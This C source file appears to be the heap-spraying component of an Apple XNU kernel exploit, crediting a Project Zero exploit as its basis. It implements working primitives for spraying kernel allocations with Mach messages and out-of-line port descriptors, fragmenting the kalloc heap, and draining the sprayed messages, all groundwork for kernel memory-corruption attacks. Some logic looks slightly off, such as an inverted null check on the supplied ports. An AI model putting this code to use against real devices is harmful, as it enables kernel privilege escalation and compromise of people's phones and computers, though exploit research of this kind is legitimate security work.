#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <assert.h>
#include <time.h>

#include <mach/mach.h>
#include <mach/host_priv.h>
#include <mach/kern_return.h>
#include <mach/mach_host.h>
#include <mach/mach_types.h>
#include <mach/port.h>
#include <mach/vm_types.h>

#include <IOKit/IOKitLib.h>

#include "mach_vm.h"

#include "mach_msg_spray.h"

// Credit to oob_timstampp by Brandon Azad for basis for code
// https://bugs.chromium.org/p/project-zero/issues/detail?id=1986

#ifndef MACH_MSG_GUARDED_PORT_DESCRIPTOR
#define MACH_MSG_GUARDED_PORT_DESCRIPTOR 4
#endif

#define min(a, b) ((a) < (b) ? (a) : (b))

// This is the size of entries in the ipc_kmsg zone. See zinit(256, ..., "ipc kmsgs").
static const size_t ipc_kmsg_zone_size = 256;
// This is the maximum number of out-of-line ports we can send in a message. See osfmk/ipc/ipc_kmsg.c.
static const size_t max_ool_ports_per_message = 16382;

struct ool_ports_message {
	mach_msg_header_t header;
	mach_msg_body_t body;

	mach_msg_ool_ports_descriptor_t ool_ports[0];
};

void ipc_kmsg_alloc_values(size_t message_size,
						   size_t *message_and_trailer_size_out,
						   size_t *kalloc_size_out,
						   size_t *message_end_offset_out)
{
	size_t kalloc_size;
	size_t message_end_offset;

	size_t max_trailer_size = 0x44;
	size_t kernel_message_size = message_size + 0x8;
	size_t message_and_trailer_size = kernel_message_size + max_trailer_size;

	size_t max_desc = 0x4 * ((kernel_message_size - 0x24) / 0xc);
	size_t max_expanded_size = message_and_trailer_size + max_desc;

	if(message_and_trailer_size_out)
		*message_and_trailer_size_out = message_and_trailer_size;

	if(max_expanded_size <= 0xa8)
		max_expanded_size = 0xa8;

	kalloc_size = max_expanded_size + 0x58;

	if(kalloc_size_out)
		*kalloc_size_out = kalloc_size;

	message_end_offset = kalloc_size - max_trailer_size;

	if(message_end_offset)
		*message_end_offset_out = message_end_offset;
}

size_t mach_message_size_for_ipc_kmsg_size(size_t ipc_kmsg_size)
{
	if(ipc_kmsg_size < ipc_kmsg_zone_size)
		ipc_kmsg_size = ipc_kmsg_zone_size;

	return ((3 * ipc_kmsg_size) / 4) - 0x74;
}

size_t mach_message_size_for_kalloc_size(size_t kalloc_size)
{
	return kalloc_size <= ipc_kmsg_zone_size ? 0 : mach_message_size_for_ipc_kmsg_size(kalloc_size);
}

size_t ipc_kmsg_size_for_mach_message_size(size_t message_size)
{
	size_t kalloc_size;

	ipc_kmsg_alloc_values(message_size, NULL, &kalloc_size, NULL);

	return kalloc_size;
}


size_t kalloc_size_for_mach_message_size(size_t message_size)
{
	size_t ipc_kmsg_size = ipc_kmsg_size_for_mach_message_size(message_size);

	return ipc_kmsg_size == ipc_kmsg_zone_size ? 0 : ipc_kmsg_size;
}


bool ipc_kmsg_kalloc_send_one(mach_port_t holding_port, size_t kalloc_size)
{
	kern_return_t kr;

	mach_msg_header_t *message;
	size_t message_size;

	message_size = mach_message_size_for_kalloc_size(kalloc_size);

	message = malloc(message_size);
	memset(message, 0, message_size);
	message->msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_MAKE_SEND, 0, 0, 0);
	message->msgh_size = (mach_msg_size_t) message_size;
	message->msgh_remote_port = holding_port;
	message->msgh_id = 'kal1';

	kr = mach_msg(message,
				  MACH_SEND_MSG | MACH_MSG_OPTION_NONE,
				  (mach_msg_size_t) message_size,
				  0,
				  MACH_PORT_NULL,
				  MACH_MSG_TIMEOUT_NONE,
				  MACH_PORT_NULL);

	if(kr != KERN_SUCCESS)
	{
		fprintf(stderr, "%s: %s returned %d: %s\n", __func__, "mach_msg", kr, mach_error_string(kr));

		return false;
	}

	free(message);

	return (kr == KERN_SUCCESS);
}


bool ool_ports_send_one(mach_port_t holding_port,
						mach_port_t *ool_ports,
						size_t ool_port_count,
						mach_msg_type_name_t ool_ports_disposition,
						size_t ipc_kmsg_size)
{
	kern_return_t kr;

	mach_port_t *dummy_ports;

	struct ool_ports_message *message;
	size_t message_size;

	dummy_ports = NULL;

	if(!ool_ports)
	{
		dummy_ports = calloc(ool_port_count, sizeof(ool_ports[0]));

		ool_ports = dummy_ports;
	}

	message_size = mach_message_size_for_ipc_kmsg_size(ipc_kmsg_size);

	message = malloc(message_size);
	memset(message, 0, message_size);

	message->header.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_MAKE_SEND, 0, 0, 0);
	message->header.msgh_size = (mach_msg_size_t) message_size;
	message->header.msgh_remote_port = holding_port;
	message->header.msgh_id = 'olp1';

	message->body.msgh_descriptor_count = 1;

	message->ool_ports[0].type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
	message->ool_ports[0].address = (void*) ool_ports;
	message->ool_ports[0].count = (mach_msg_size_t) ool_port_count;
	message->ool_ports[0].deallocate = FALSE;
	message->ool_ports[0].copy = MACH_MSG_PHYSICAL_COPY;
	message->ool_ports[0].disposition = ool_ports_disposition;

	kr = mach_msg(&message->header,
				  MACH_SEND_MSG | MACH_MSG_OPTION_NONE,
				  (mach_msg_size_t) message_size,
				  0,
				  MACH_PORT_NULL,
				  MACH_MSG_TIMEOUT_NONE,
				  MACH_PORT_NULL);

	if(kr != KERN_SUCCESS)
	{
		fprintf(stderr, "%s: %s returned %d: %s\n", __func__, "mach_msg", kr, mach_error_string(kr));

		return false;
	}

	if(dummy_ports)
		free(dummy_ports);

	free(message);

	return (kr == KERN_SUCCESS);
}


size_t mach_message_spray(mach_port_t *holding_ports,
						  size_t *holding_port_count,
						  mach_msg_header_t *message,
						  size_t message_size,
						  size_t message_count,
						  size_t messages_per_port)
{
	size_t port_count;
	size_t ports_used;
	size_t messages_sent_on_port;

	bool send_failure = true;
	
	size_t messages_sent = 0;

	if(messages_per_port == 0 || messages_per_port > MACH_PORT_QLIMIT_MAX)
		messages_per_port = MACH_PORT_QLIMIT_MAX;

	port_count = *holding_port_count;
	ports_used = 0;

	messages_sent_on_port = 0;

	while(messages_sent < message_count)
	{
		kern_return_t kr;

		if(send_failure || messages_sent_on_port >= messages_per_port)
		{
			if(ports_used + 1 >= port_count)
				break;

			message->msgh_remote_port = holding_ports[ports_used];

			ports_used++;
			messages_sent_on_port = 0;
			send_failure = false;
		}

		kr = mach_msg(message,
					  MACH_SEND_MSG | MACH_MSG_OPTION_NONE,
					  (mach_msg_size_t) message_size,
					  0,
					  MACH_PORT_NULL,
					  MACH_MSG_TIMEOUT_NONE,
					  MACH_PORT_NULL);

		if(kr != KERN_SUCCESS)
		{
			fprintf(stderr, "%s: %s returned %d: %s\n", __func__, "mach_msg", kr, mach_error_string(kr));

			send_failure = true;
		}

		if(!send_failure)
		{
			messages_sent++;
			messages_sent_on_port++;
		}
	}

	*holding_port_count = ports_used;

	return messages_sent;
}


size_t mach_message_alternating_spray(mach_port_t *holding_ports,
									  size_t *holding_port_count,
									  mach_msg_header_t **messages,
									  size_t *message_sizes,
									  size_t message_count,
									  size_t messages_per_port)
{
	mach_port_t port_pair[2];

	size_t port_count;
	size_t ports_used;
	size_t messages_sent_on_port;

	bool send_failure = true;
	
	size_t messages_sent = 0;

	if(messages_per_port == 0 || messages_per_port > MACH_PORT_QLIMIT_MAX)
		messages_per_port = MACH_PORT_QLIMIT_MAX;

	port_count = *holding_port_count;
	ports_used = 0;

	while(messages_sent < message_count)
	{
		if(send_failure || messages_sent_on_port >= messages_per_port)
		{
			if(ports_used + 1 > port_count)
				break;

			port_pair[0] = holding_ports[ports_used];
			port_pair[1] = holding_ports[ports_used + 1];

			ports_used += 2;
			messages_sent_on_port = 0;
			send_failure = false;
		}

		for(int i = 0; i < 2; i++)
		{
			kern_return_t kr;

			messages[i]->msgh_remote_port = port_pair[i];

			kr = mach_msg(messages[i],
						  MACH_SEND_MSG | MACH_MSG_OPTION_NONE,
						  (mach_msg_size_t) message_sizes[i],
						  0,
						  MACH_PORT_NULL,
						  MACH_MSG_TIMEOUT_NONE,
						  MACH_PORT_NULL);

			if(kr != KERN_SUCCESS)
			{
				fprintf(stderr, "%s: %s returned %d: %s\n", __func__, "mach_msg", kr, mach_error_string(kr));

				send_failure = true;
			}
		}

		if(!send_failure)
		{
			messages_sent += 2;
			messages_sent_on_port += 2;
		}
	}

	*holding_port_count = ports_used;

	return messages_sent;
}


size_t ipc_kmsg_kalloc_fragmentation_spray(mach_port_t *holding_ports,
										   size_t *holding_port_count,
										   size_t kalloc_size,
										   size_t message_count,
										   size_t messages_per_port)
{
	size_t messages_sent;

	mach_msg_header_t *message;

	size_t message_size;

	message_size = mach_message_size_for_kalloc_size(kalloc_size);

	message = malloc(message_size);
	memset(message, 0, message_size);
	message->msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_MAKE_SEND, 0, 0, 0);
	message->msgh_size = (mach_msg_size_t) message_size;
	message->msgh_id = 'fgmt';

	mach_msg_header_t *messages[2] = { message, message };
	size_t message_sizes[2] = { message_size, message_size};

	messages_sent = mach_message_alternating_spray(holding_ports,
												   holding_port_count,
												   messages,
												   message_sizes,
												   message_count,
												   messages_per_port);

	free(message);

	return messages_sent;
}

size_t ipc_kmsg_kalloc_spray_contents_size(size_t kalloc_size,
										   size_t *contents_start,
										   size_t *contents_end)
{
	size_t message_contents_size;

	size_t message_size;

	size_t kalloc_size_check;

	size_t kmsg_offset_contents_begin;
	size_t kmsg_offset_message_end;

	message_size = mach_message_size_for_ipc_kmsg_size(kalloc_size);

	ipc_kmsg_alloc_values(message_size, NULL, &kalloc_size_check, &kmsg_offset_message_end);

	assert(kalloc_size_check == kalloc_size);

	message_contents_size = message_size - sizeof(mach_msg_header_t);

	kmsg_offset_contents_begin = kmsg_offset_message_end - message_contents_size;

	if(contents_start)
		*contents_start = kmsg_offset_contents_begin;

	if(contents_end)
		*contents_end = kmsg_offset_message_end;

	return message_contents_size;
}


size_t ipc_kmsg_kalloc_spray(mach_port_t *holding_ports,
							 size_t *holding_port_count,
							 void *data,
							 size_t kalloc_size,
							 size_t message_count,
							 size_t messages_per_port)
{
	mach_msg_header_t *message;

	size_t message_size;

	size_t messages_sent;

	assert(kalloc_size >= ipc_kmsg_zone_size);
	assert(messages_per_port <= MACH_PORT_QLIMIT_MAX);

	message_size = mach_message_size_for_kalloc_size(kalloc_size);

	message = malloc(message_size);
	memset(message, 0, message_size);
	message->msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_MAKE_SEND, 0, 0, 0);
	message->msgh_size = (mach_msg_size_t) message_size;
	message->msgh_id   = 'kals';

	if(data)
	{
		void *contents = (void*) (message + 1);
		size_t contents_size = message_size - sizeof(mach_msg_header_t);

		memcpy(contents, data, contents_size);
	}

	messages_sent = mach_message_spray(holding_ports,
									   holding_port_count,
									   message,
									   message_size,
									   message_count,
									   messages_per_port);

	free(message);

	return messages_sent;
}

size_t ool_ports_spray(mach_port_t *holding_ports,
					   size_t *holding_port_count,
					   mach_port_t *ool_ports,
					   size_t ool_port_count,
					   mach_msg_type_name_t ool_port_disposition,
					   size_t ool_port_descriptor_count,
					   size_t ool_port_descriptors_per_message,
					   size_t ipc_kmsg_size,
					   size_t messages_per_port)
{
	struct ool_ports_message *message;

	mach_msg_ool_ports_descriptor_t descriptor = {};

	mach_port_t *dummy_ports;

	size_t message_size;
	size_t message_header_size;

	size_t message_ool_port_descriptor_capacity;
	size_t message_ool_port_descriptor_limit;

	size_t max_ool_port_descriptors_per_message;

	size_t port_count;
	size_t ports_used = 0;

	size_t messages_sent_on_port;

	bool send_failure;

	size_t descriptors_sent;

	dummy_ports = NULL;

	if (messages_per_port == 0 || messages_per_port > MACH_PORT_QLIMIT_MAX)
		messages_per_port = MACH_PORT_QLIMIT_MAX;
	
	if(ool_ports)
	{
		dummy_ports = calloc(ool_port_count, sizeof(ool_ports[0]));

		ool_ports = dummy_ports;
	}

	message_size = mach_message_size_for_ipc_kmsg_size(ipc_kmsg_size);
	message_header_size = sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t);

	message_ool_port_descriptor_capacity = (message_size - message_header_size);
	message_ool_port_descriptor_limit = max_ool_ports_per_message / ool_port_count;

	max_ool_port_descriptors_per_message = min(message_ool_port_descriptor_capacity, message_ool_port_descriptor_limit);

	if(!ool_port_descriptors_per_message)
		ool_port_descriptors_per_message = max_ool_port_descriptors_per_message;

	assert(ool_port_descriptors_per_message <= max_ool_port_descriptors_per_message);

	message = malloc(message_size);
	memset(message, 0, message_size);
	message->header.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_MAKE_SEND, 0, 0, MACH_MSGH_BITS_COMPLEX);
	message->header.msgh_size = (mach_msg_size_t) message_size;
	message->header.msgh_id   = 'olps';
	message->body.msgh_descriptor_count = (mach_msg_size_t) ool_port_descriptors_per_message;

	descriptor.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
	descriptor.address = (void*) ool_ports;
	descriptor.count = (mach_msg_size_t) ool_port_count;
	descriptor.deallocate = FALSE;
	descriptor.copy = MACH_MSG_PHYSICAL_COPY;
	descriptor.disposition = ool_port_disposition;

	for(size_t i = 0; i < ool_port_descriptors_per_message; i++)
	{
		message->ool_ports[i] = descriptor;
	}

	port_count = *holding_port_count;
	ports_used = 0;

	messages_sent_on_port = 0;
	send_failure = true;

	descriptors_sent = 0;

	while(descriptors_sent < ool_port_descriptor_count)
	{
		kern_return_t kr;

		if(send_failure || messages_sent_on_port >= messages_per_port)
		{
			if(ports_used >= port_count)
				break;

			message->header.msgh_remote_port = holding_ports[ports_used];

			ports_used++;
			messages_sent_on_port = 0;
			send_failure = false;
		}

		size_t descriptors_to_send = ool_port_descriptors_per_message;
		size_t descriptors_left = ool_port_descriptor_count - descriptors_sent;

		if(descriptors_left < descriptors_to_send)
		{
			descriptors_to_send = descriptors_left;

			message->body.msgh_descriptor_count = (mach_msg_size_t) descriptors_to_send;
		}

		kr = mach_msg(&message->header,
					  MACH_SEND_MSG | MACH_MSG_OPTION_NONE,
					  (mach_msg_size_t) message_size,
					  0,
					  MACH_PORT_NULL,
					  MACH_MSG_TIMEOUT_NONE,
					  MACH_PORT_NULL);

		if(kr != KERN_SUCCESS)
		{
			fprintf(stderr, "%s: %s returned %d: %s\n", __func__, "mach_msg", kr, mach_error_string(kr));

			send_failure = true;
		}

		if(!send_failure)
		{
			descriptors_sent += descriptors_to_send;

			messages_sent_on_port++;
		}
	}

	if(dummy_ports)
		free(dummy_ports);

	free(message);

	*holding_port_count = ports_used;

	return descriptors_sent;
}

void mach_port_drain_messages(mach_port_t port, void (^message_handler)(mach_msg_header_t*))
{
	kern_return_t kr;

	mach_msg_options_t options;

	mach_msg_size_t msg_size;
	mach_msg_base_t *msg;

	options = MACH_RCV_MSG | MACH_RCV_LARGE | MACH_RCV_TIMEOUT | MACH_RCV_TRAILER_TYPE(MACH_MSG_TRAILER_FORMAT_0) | MACH_RCV_TRAILER_ELEMENTS(MACH_RCV_TRAILER_NULL);

	msg_size = 0x4000;
	msg = malloc(msg_size);

	for(; ;)
	{
		for(size_t try = 0; ;try++)
		{
			kr = mach_msg(&msg->header,
						  options,
						  0,
						  msg_size,
						  port,
						  0,
						  MACH_PORT_NULL);

			if(kr != MACH_RCV_LARGE)
				break;

			msg_size = msg->header.msgh_size + REQUESTED_TRAILER_SIZE(options);

			free(msg);
			msg = malloc(msg_size);
		}

		if(kr != KERN_SUCCESS)
		{
			if(kr != MACH_RCV_TIMED_OUT)
			{
				fprintf(stderr, "%s: %s returned %d: %s\n", __func__, "mach_msg", kr, mach_error_string(kr));
			}

			break;
		}

		message_handler(&msg->header);
	}

	free(msg);
}

void ool_ports_spray_receive(mach_port_t *holding_ports,
							 size_t holding_port_count,
							 void (^ool_ports_handler)(mach_port_t *, size_t))
{
	for(size_t port_index = 0; port_index < holding_port_count; port_index++)
	{
		mach_port_drain_messages(holding_ports[port_index], ^(mach_msg_header_t *header) {
			struct ool_ports_message *message = (struct ool_ports_message*) header;

			if(message->header.msgh_id != 'olps')
				goto done;

			if(!MACH_MSGH_BITS_IS_COMPLEX(message->header.msgh_bits))
				goto done;

			mach_msg_descriptor_t *d = (mach_msg_descriptor_t*) &message->ool_ports[0];

			for(size_t i = 0; i < message->body.msgh_descriptor_count; i++)
			{
				mach_port_t *ports;

				void *next;

				switch(d->type.type)
				{
					case MACH_MSG_OOL_PORTS_DESCRIPTOR:
						next = &d->ool_ports + 1;

						ports = (mach_port_t*) d->ool_ports.address;

						size_t count = d->ool_ports.count;

						ool_ports_handler(ports, count);

						break;
					default:
						goto done;
				}

				d = (mach_msg_descriptor_t*) next;
			}
done:
			mach_msg_destroy(&message->header);
		
		});
	}
}

void
ool_ports_receive(mach_port_t *holding_ports,
				  size_t holding_port_count,
				  void (^ool_ports_handler)(mach_port_t *, size_t)) 
{
	for (size_t port_index = 0; port_index < holding_port_count; port_index++) {
		mach_port_drain_messages(holding_ports[port_index], ^(mach_msg_header_t *header) {
			mach_msg_body_t *body = (mach_msg_body_t *) (header + 1);

			if (!MACH_MSGH_BITS_IS_COMPLEX(header->msgh_bits))
				goto done;
			
			size_t descriptor_count = body->msgh_descriptor_count;
			
			mach_msg_descriptor_t *d = (mach_msg_descriptor_t *) (body + 1);
			
			for (size_t i = 0; i < descriptor_count; i++)
			{
				mach_port_t *ports;

				void *next;

				switch (d->type.type)
				{
					case MACH_MSG_PORT_DESCRIPTOR:
						next = &d->port + 1;
						break;

					case MACH_MSG_OOL_DESCRIPTOR:

					case MACH_MSG_OOL_VOLATILE_DESCRIPTOR:
						next = &d->out_of_line + 1;
						break;

					case MACH_MSG_OOL_PORTS_DESCRIPTOR:
						next = &d->ool_ports + 1;
						mach_port_t *ports = (mach_port_t *)
							d->ool_ports.address;
						size_t count = d->ool_ports.count;
						ool_ports_handler(ports, count);
						break;

					case MACH_MSG_GUARDED_PORT_DESCRIPTOR:
						next = &d->port + 1;
						break;

					default:
						goto done;
				}

				d = (mach_msg_descriptor_t *) next;
			}
done:
			mach_msg_destroy(header);
		});
	}
}

mach_port_t* mach_ports_create(size_t count)
{
	kern_return_t kr;

	mach_port_t *ports;
	mach_port_options_t options = {};

	ports = calloc(count, sizeof(*ports));

	for(size_t i = 0; i < count; i++)
	{
		kr = mach_port_construct(mach_task_self(), &options, 0, &ports[i]);

		if(kr != KERN_SUCCESS)
			fprintf(stderr, "%s: %s returned %d: %s\n", __func__, "mach_port_construct", kr, mach_error_string(kr));

		assert(kr == KERN_SUCCESS);
	}

	return ports;
}


void mach_ports_destroy(mach_port_t *ports, size_t count)
{
	kern_return_t kr;

	for(size_t i = 0; i < count; i++)
	{
		mach_port_t port = ports[i];

		if(MACH_PORT_VALID(port))
		{
			kr = mach_port_deallocate(mach_task_self(), port);

			if(kr != KERN_SUCCESS)
				fprintf(stderr, "%s: %s returned %d: %s\n", __func__, "mach_port_deallocate", kr, mach_error_string(kr));
			
			assert(kr == KERN_SUCCESS);
		}

		ports[i] = MACH_PORT_DEAD;
	}
}

void mach_ports_deallocate(mach_port_t *ports, size_t count)
{
	kern_return_t kr;

	for(size_t i = 0; i < count; i ++)
	{
		mach_port_t port = ports[i];

		if(MACH_PORT_VALID(port))
		{
			kr = mach_port_deallocate(mach_task_self(), port);

			if(kr != KERN_SUCCESS)
				fprintf(stderr, "%s: %s returned %d: %s\n", __func__, "mach_port_deallocate", kr, mach_error_string(kr));
		
			assert(kr == KERN_SUCCESS);
		}

		ports[i] = MACH_PORT_DEAD;
	}
}

void mach_port_increase_queue_limit(mach_port_t port)
{
	kern_return_t kr;

	mach_port_limits_t limits = { .mpl_qlimit = MACH_PORT_QLIMIT_MAX };

	kr = mach_port_set_attributes(mach_task_self(),
												port,
												MACH_PORT_LIMITS_INFO,
												(mach_port_info_t) &limits,
												MACH_PORT_LIMITS_INFO_COUNT);

	assert(kr == KERN_SUCCESS);
}

void mach_port_insert_send_right(mach_port_t port)
{
	kern_return_t kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);

	assert(kr == KERN_SUCCESS);
}


struct holding_port_array holding_ports_create(size_t count)
{
	mach_port_t *ports = mach_ports_create(count);

	for(size_t i = 0; i < count; i++)
	{
		mach_port_increase_queue_limit(ports[i]);
	}

	return (struct holding_port_array) { ports, count };
}

void holding_ports_destroy(struct holding_port_array all_ports)
{
	mach_ports_destroy(all_ports.ports, all_ports.count);

	free(all_ports.ports);
}

mach_port_t holding_port_grab(struct holding_port_array *holding_ports)
{
	mach_port_t port;

	if(holding_ports->count == 0)
		return MACH_PORT_NULL;

	port = holding_ports->ports[0];

	holding_ports->ports++;
	holding_ports->count--;

	return port;
}

mach_port_t holding_ports_pop(struct holding_port_array *holding_ports)
{
	mach_port_t port;

	if(holding_ports->count == 0)
		return MACH_PORT_NULL;

	port = holding_ports->ports[0];

	holding_ports->ports[0] = MACH_PORT_DEAD;
	holding_ports->ports++;
	holding_ports->count--;

	return port;
}


void
ipc_kmsg_kalloc_fragmentation_spray_(struct ipc_kmsg_kalloc_fragmentation_spray *spray,
									 size_t kalloc_size,
									 size_t spray_size,
									 size_t kalloc_size_per_port,
									 struct holding_port_array *holding_ports)
{
	struct holding_port_array ports;

	size_t message_per_port;
	size_t message_count;

	size_t ports_used;
	size_t sprayed_count;

	assert(kalloc_size <= spray_size);
	assert(kalloc_size_per_port >= kalloc_size);

	size_t messages_per_port = kalloc_size_per_port / kalloc_size;
	
	if (messages_per_port > MACH_PORT_QLIMIT_MAX)
		messages_per_port = MACH_PORT_QLIMIT_MAX;

	message_count = spray_size / kalloc_size;

	ports = *holding_ports;
	ports_used = ports.count;

	sprayed_count = ipc_kmsg_kalloc_fragmentation_spray(ports.ports, &ports_used,
			kalloc_size, message_count, messages_per_port);

	holding_ports->ports = ports.ports + ports_used;
	holding_ports->count = ports.count - ports_used;

	spray->holding_ports.ports = ports.ports;
	spray->holding_ports.count = ports_used;

	spray->spray_size = sprayed_count * kalloc_size;
	spray->kalloc_size_per_port = kalloc_size * messages_per_port;
}

void
ipc_kmsg_kalloc_fragmentation_spray_fragment_memory_(struct ipc_kmsg_kalloc_fragmentation_spray *spray,
													 size_t free_size,
													 int from_end)
{
	mach_port_t *ports;

	size_t ports_left;
	size_t kalloc_size_per_port;

	size_t port_idx;
	int increment;

	ports = spray->holding_ports.ports;
	ports_left = spray->holding_ports.count;

	assert((ports_left % 2) == 0);

	kalloc_size_per_port = spray->kalloc_size_per_port;

	if (from_end >= 0)
	{
		port_idx = 0;
		increment = 2;
	} else
	{
		port_idx = ports_left - 2;
		increment = -2;
	}

	for (; free_size > 0 && ports_left > 0; ports_left -= 2, port_idx += increment)
	{
		mach_port_t port = ports[port_idx];
		
		if (!MACH_PORT_VALID(port))
			continue;

		mach_port_deallocate(mach_task_self(), port);

		ports[port_idx] = MACH_PORT_DEAD;
		free_size -= kalloc_size_per_port;
	}
}

void ipc_kmsg_kalloc_spray_(struct ipc_kmsg_kalloc_spray *spray,
							void *data,
							size_t kalloc_size,
							size_t spray_size,
							size_t kalloc_allocation_limit_per_port,
							struct holding_port_array *holding_ports)
{
	struct holding_port_array ports;

	size_t messages_per_port;
	size_t message_count;

	size_t ports_used;
	size_t sprayed_count;

	messages_per_port = kalloc_allocation_limit_per_port / kalloc_size;
	
	if (messages_per_port > MACH_PORT_QLIMIT_MAX)
		messages_per_port = MACH_PORT_QLIMIT_MAX;

	assert(kalloc_size <= spray_size);
	assert(kalloc_allocation_limit_per_port == 0 || kalloc_allocation_limit_per_port >= kalloc_size);

	message_count = spray_size / kalloc_size;

	ports = *holding_ports;
	ports_used = ports.count;

	sprayed_count = ipc_kmsg_kalloc_spray(ports.ports, &ports_used,
			data, kalloc_size, message_count, messages_per_port);

	holding_ports->ports = ports.ports + ports_used;
	holding_ports->count = ports.count - ports_used;

	spray->holding_ports.ports = ports.ports;
	spray->holding_ports.count = ports_used;

	spray->spray_size = sprayed_count * kalloc_size;
	spray->kalloc_allocation_size_per_port = kalloc_size * messages_per_port;
}

void ool_ports_spray_(struct ool_ports_spray *spray,
				 mach_port_t *ool_ports,
				 size_t ool_port_count,
				 mach_msg_type_name_t ool_ports_disposition,
				 size_t ool_port_descriptor_count,
				 size_t ool_port_descriptors_per_message,
				 size_t ipc_kmsg_size,
				 size_t messages_per_port,
				 struct holding_port_array *holding_ports)
{
	struct holding_port_array ports;

	size_t ports_used;
	size_t sprayed_count;

	assert(ool_port_count <= max_ool_ports_per_message);

	ports = *holding_ports;
	ports_used = ports.count;

	sprayed_count = ool_ports_spray(ports.ports, &ports_used,
									ool_ports, ool_port_count, ool_ports_disposition,
									ool_port_descriptor_count, ool_port_descriptors_per_message,
									ipc_kmsg_size, messages_per_port);

	holding_ports->ports = ports.ports + ports_used;
	holding_ports->count = ports.count - ports_used;

	spray->holding_ports.ports = ports.ports;
	spray->holding_ports.count = ports_used;

	spray->sprayed_count = sprayed_count;
}
